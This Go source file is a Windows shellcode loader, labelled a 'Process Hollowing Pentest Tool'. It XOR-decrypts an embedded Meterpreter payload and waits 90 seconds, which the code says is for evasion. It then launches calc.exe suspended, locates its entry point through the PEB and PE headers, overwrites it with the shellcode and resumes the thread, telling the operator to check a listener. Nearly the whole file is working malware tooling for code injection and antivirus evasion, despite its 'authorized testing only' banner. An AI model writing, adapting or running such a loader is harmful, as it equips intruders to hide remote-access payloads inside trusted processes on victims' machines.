package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	CREATE_SUSPENDED              = 0x00000004
	MEM_COMMIT                    = 0x00001000
	MEM_RESERVE                   = 0x00002000
	PAGE_EXECUTE_READWRITE        = 0x40
	CONTEXT_FULL          uintptr = 0x10000b
)

// Windows API structures
type STARTUPINFO struct {
	Cb              uint32
	_               *uint16
	Desktop         *uint16
	Title           *uint16
	X               uint32
	Y               uint32
	XSize           uint32
	YSize           uint32
	XCountChars     uint32
	YCountChars     uint32
	FillAttribute   uint32
	Flags           uint32
	ShowWindow      uint16
	_               uint16
	_               *byte
	StdInput        uintptr
	StdOutput       uintptr
	StdError        uintptr
}

type PROCESS_INFORMATION struct {
	Process   uintptr
	Thread    uintptr
	ProcessId uint32
	ThreadId  uint32
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

// Global variables for dynamically loaded APIs
var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	ntdll                   = syscall.NewLazyDLL("ntdll.dll")

	procCreateProcessA      = kernel32.NewProc("CreateProcessA")
	procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory   = kernel32.NewProc("ReadProcessMemory")
	procGetThreadContext    = kernel32.NewProc("GetThreadContext")
	procSetThreadContext    = kernel32.NewProc("SetThreadContext")
	procResumeThread        = kernel32.NewProc("ResumeThread")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
)

// XOR-encrypted meterpreter payload
// This will be replaced by the compiler script
var encryptedPayload = []byte{PAYLOAD_BYTES}

var xorKey byte = 0xaa

// XorDecrypt performs XOR decryption
func XorDecrypt(encrypted []byte, key byte) []byte {
	decrypted := make([]byte, len(encrypted))
	for i, b := range encrypted {
		decrypted[i] = b ^ key
	}
	return decrypted
}

// CreateProcess creates a new process in suspended state
func CreateProcess(commandLine string) (*PROCESS_INFORMATION, error) {
	var si STARTUPINFO
	var pi PROCESS_INFORMATION

	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := syscall.BytePtrFromString(commandLine)
	if err != nil {
		return nil, err
	}

	ret, _, err := procCreateProcessA.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CreateProcessA failed: %v", err)
	}

	return &pi, nil
}

// GetThreadContext retrieves the thread context
func GetThreadContext(thread uintptr, ctx *CONTEXT) error {
	ctx.ContextFlags = uint32(CONTEXT_FULL)

	ret, _, err := procGetThreadContext.Call(
		thread,
		uintptr(unsafe.Pointer(ctx)),
	)

	if ret == 0 {
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}

	return nil
}

// ReadProcessMemory reads memory from target process
func ReadProcessMemory(process uintptr, address uintptr, size uint32) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr

	ret, _, err := procReadProcessMemory.Call(
		process,
		address,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("ReadProcessMemory failed: %v", err)
	}

	return buffer, nil
}

// NtUnmapViewOfSection unmaps a section from process memory
func NtUnmapViewOfSection(process uintptr, baseAddress uintptr) error {
	ret, _, _ := procNtUnmapViewOfSection.Call(
		process,
		baseAddress,
	)

	if ret != 0 {
		return fmt.Errorf("NtUnmapViewOfSection failed with status: 0x%x", ret)
	}

	return nil
}

// VirtualAllocEx allocates memory in target process
func VirtualAllocEx(process uintptr, address uintptr, size uintptr, allocType uint32, protect uint32) (uintptr, error) {
	ret, _, err := procVirtualAllocEx.Call(
		process,
		address,
		size,
		uintptr(allocType),
		uintptr(protect),
	)

	if ret == 0 {
		return 0, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	return ret, nil
}

// WriteProcessMemory writes memory to target process
func WriteProcessMemory(process uintptr, address uintptr, data []byte) error {
	var bytesWritten uintptr

	ret, _, err := procWriteProcessMemory.Call(
		process,
		address,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	return nil
}

// SetThreadContext sets the thread context
func SetThreadContext(thread uintptr, ctx *CONTEXT) error {
	ret, _, err := procSetThreadContext.Call(
		thread,
		uintptr(unsafe.Pointer(ctx)),
	)

	if ret == 0 {
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}

	return nil
}

// ResumeThread resumes a suspended thread
func ResumeThread(thread uintptr) error {
	ret, _, err := procResumeThread.Call(thread)

	if ret == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread failed: %v", err)
	}

	return nil
}

// ProcessHollow performs process hollowing
func ProcessHollow(payload []byte, targetProcess string) error {
	fmt.Println("[+] Resolving APIs dynamically...")

	// All APIs are already resolved via LazyDLL
	fmt.Println("[+] APIs resolved successfully")

	// Create target process in suspended state
	fmt.Printf("[+] Creating suspended process: %s\n", targetProcess)
	pi, err := CreateProcess(targetProcess)
	if err != nil {
		return fmt.Errorf("failed to create process: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(pi.Process))
	defer syscall.CloseHandle(syscall.Handle(pi.Thread))

	fmt.Printf("[+] Process created with PID: %d\n", pi.ProcessId)

	// Get thread context
	var ctx CONTEXT
	if err := GetThreadContext(pi.Thread, &ctx); err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return fmt.Errorf("failed to get thread context: %v", err)
	}

	// Read PEB address from RDX (x64)
	pebAddress := ctx.Rdx
	fmt.Printf("[+] PEB Address: 0x%x\n", pebAddress)

	// Step 1: Read executable base address from PEB+0x10 (8 bytes)
	imageBaseBuffer, err := ReadProcessMemory(pi.Process, uintptr(pebAddress+0x10), 8)
	if err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return fmt.Errorf("failed to read image base: %v", err)
	}

	executableAddress := *(*uint64)(unsafe.Pointer(&imageBaseBuffer[0]))
	fmt.Printf("[+] Executable base address: 0x%x\n", executableAddress)

	// Step 2: Read first 0x200 bytes of executable to parse PE headers
	dataBuf, err := ReadProcessMemory(pi.Process, uintptr(executableAddress), 0x200)
	if err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return fmt.Errorf("failed to read PE headers: %v", err)
	}

	// Step 3: Read e_lfanew (offset to PE header) at offset 0x3C
	e_lfanew := *(*uint32)(unsafe.Pointer(&dataBuf[0x3c]))
	fmt.Printf("[+] e_lfanew offset: 0x%x\n", e_lfanew)

	// Step 4: Calculate RVA offset (PE header + 0x28)
	rvaOffset := e_lfanew + 0x28
	fmt.Printf("[+] RVA offset: 0x%x\n", rvaOffset)

	// Step 5: Read the RVA value (entry point offset from base)
	rva := *(*uint32)(unsafe.Pointer(&dataBuf[rvaOffset]))
	fmt.Printf("[+] Entry point RVA: 0x%x\n", rva)

	// Step 6: Calculate absolute entry point address
	entrypointAddr := executableAddress + uint64(rva)
	fmt.Printf("[+] Absolute entry point address: 0x%x\n", entrypointAddr)

	// Step 7: Overwrite entry point with our payload
	fmt.Println("[+] Overwriting entry point with shellcode...")
	if err := WriteProcessMemory(pi.Process, uintptr(entrypointAddr), payload); err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return fmt.Errorf("failed to write payload: %v", err)
	}

	fmt.Printf("[+] Wrote %d bytes of shellcode to entry point\n", len(payload))

	// Step 8: Resume thread to execute our payload
	fmt.Println("[+] Resuming thread to trigger payload execution...")
	if err := ResumeThread(pi.Thread); err != nil {
		syscall.TerminateProcess(syscall.Handle(pi.Process), 1)
		return fmt.Errorf("failed to resume thread: %v", err)
	}

	fmt.Println("[+] Entry point overwrite complete!")
	fmt.Println("[*] Shellcode should be executing now - check your listener!")
	return nil
}

func main() {
	fmt.Println("========================================")
	fmt.Println("  Process Hollowing Pentest Tool (Go)")
	fmt.Println("  FOR AUTHORIZED TESTING ONLY")
	fmt.Println("========================================")
	fmt.Println()

	// Step 1: Decrypt XOR-encrypted payload
	fmt.Println("[*] Step 1: Decrypting meterpreter payload...")
	payload := XorDecrypt(encryptedPayload, xorKey)
	fmt.Printf("[+] Payload decrypted (%d bytes)\n", len(payload))

	// Step 2: Sleep for 1-2 minutes (using 90 seconds = 1.5 minutes)
	fmt.Println()
	fmt.Println("[*] Step 2: Sleeping for 90 seconds (1.5 minutes)...")
	fmt.Println("[*] This simulates evasion timing...")

	// For testing, you can reduce this
	sleepDuration := 90 * time.Second
	// Uncomment for testing with shorter delay:
	// sleepDuration = 5 * time.Second

	time.Sleep(sleepDuration)
	fmt.Println("[+] Sleep completed")

	// Step 3: Process hollowing with dynamic API resolution
	fmt.Println()
	fmt.Println("[*] Step 3: Performing process hollowing...")
	if err := ProcessHollow(payload, "C:\\Windows\\System32\\calc.exe"); err != nil {
		fmt.Printf("[-] Process hollowing failed: %v\n", err)
		return
	}

	fmt.Println()
	fmt.Println("[+] All steps completed successfully!")

	// Keep the process alive for a bit
	time.Sleep(2 * time.Second)
}
